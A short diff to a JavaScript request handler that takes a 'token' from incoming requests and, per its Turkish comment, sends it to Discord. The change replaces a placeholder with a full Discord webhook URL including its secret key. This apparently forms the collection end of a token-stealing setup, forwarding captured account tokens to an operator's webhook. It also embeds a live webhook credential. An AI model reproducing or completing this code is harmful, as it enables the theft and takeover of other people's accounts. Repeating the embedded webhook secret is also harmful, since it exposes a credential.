@@ -3,7 +3,7 @@ export default async function handler(req, res) {
  const { token } = req.body;
  
  if (token) {
- const WEBHOOK_URL = "PASTE_YOUR_DISCORD_WEBHOOK_HERE";
+ const WEBHOOK_URL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd";
  
  try {
  // Token'ı Discord'a gönder
